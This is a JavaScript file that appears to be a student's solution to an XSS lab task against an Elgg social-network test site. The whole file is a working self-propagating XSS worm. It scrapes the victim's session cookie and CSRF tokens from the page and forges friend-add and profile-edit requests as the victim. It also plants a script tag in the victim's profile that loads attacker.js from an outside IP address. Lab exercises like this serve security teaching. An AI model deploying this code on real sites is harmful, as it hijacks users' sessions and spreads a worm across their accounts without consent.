// Task 6: For everyone
// Enze Xu
console.log("Hello I am the attacker!");

let __elgg_ts = document.getElementsByClassName("elgg-menu-content")[2].href.substr(50, 10);
let __elgg_token = document.getElementsByClassName("elgg-menu-content")[2].href.substr(74, 22);
let target_id = document.getElementsByClassName("photo u-photo")[0].src.substr(104, 2);//let samy_id = String(47);
let cookie = document.cookie;
let me = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].alt;
let my_id = document.getElementsByClassName("elgg-border-plain elgg-transition")[0].src.substr(104, 2);
console.log("target_id = " + target_id);
console.log("cookie = " + cookie);
console.log("__elgg_ts = " + __elgg_ts);
console.log("__elgg_token = " + __elgg_token);
console.log("me = " + me);
console.log("my_id = " + my_id);

if (my_id != target_id) {
	// make friends
	var Ajax1=null;
	Ajax1=new XMLHttpRequest();
	let http_url1 = "http://www.xsslabelgg.com/action/friends/add?friend="+target_id+"&__elgg_ts="+__elgg_ts+"&__elgg_token="+__elgg_token;
	console.log(http_url1);
	Ajax1.open("POST",http_url1,true);
	Ajax1.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax1.setRequestHeader("Keep-Alive","300");
	Ajax1.setRequestHeader("Connection","keep-alive");
	Ajax1.setRequestHeader("Cookie",cookie);
	Ajax1.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	var content="";//var content="name=..&description=...&guid=";
	Ajax1.send(content);
	
	// alter profile
	var Ajax2=null;
	Ajax2=new XMLHttpRequest();
	let http_url2 = 'http://www.xsslabelgg.com/action/profile/edit?__elgg_token='+__elgg_token+'&__elgg_ts='+__elgg_ts+'&name='+me+'&description=&accesslevel[description]=2&briefdescription=<script type="text/javascript" src=http://13.58.241.86:8888/js/attacker.js></script>&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid='+my_id;
	console.log(http_url2);
	Ajax2.open("POST",http_url2,true);
	Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax2.setRequestHeader("Keep-Alive","300");
	Ajax2.setRequestHeader("Connection","keep-alive");
	Ajax2.setRequestHeader("Cookie",cookie);
	Ajax2.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	var content="";//var content="name=..&description=...&guid=";
	Ajax2.send(content);
}
else {
	console.log("I don't need to be my friend or alter my profile.");
}
